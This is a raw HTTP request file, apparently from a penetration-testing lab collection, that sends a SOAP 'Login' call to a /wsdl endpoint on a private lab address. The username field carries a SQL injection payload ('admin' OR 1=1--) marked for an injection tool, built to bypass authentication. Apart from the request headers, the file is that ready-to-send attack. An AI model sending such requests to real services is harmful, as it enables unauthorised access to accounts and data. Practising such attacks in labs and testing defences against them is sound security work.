Web/API/WSLD Spoof/WSDL_Spoof.req

POST /wsdl HTTP/1.1
Host: 10.129.202.133:3002
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en
Accept-Encoding: gzip, deflate, br
Connection: close
Content-Length: 402
SOAPAction: "Login"

<?xml version='1.0' encoding='utf-8'?><soap:Envelope xmlns:soap='http://schemas.xmlsoap.org/soap/envelope/' xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance' xmlns:tns='http://tempuri.org/' xmlns:tm='http://microsoft.com/wsdl/mime/textMatching/'><soap:Body><LoginRequest xmlns='http://tempuri.org/'><username>admin'%20OR%201=1--*</username><password>admin</password></LoginRequest></soap:Body></soap:Envelope>

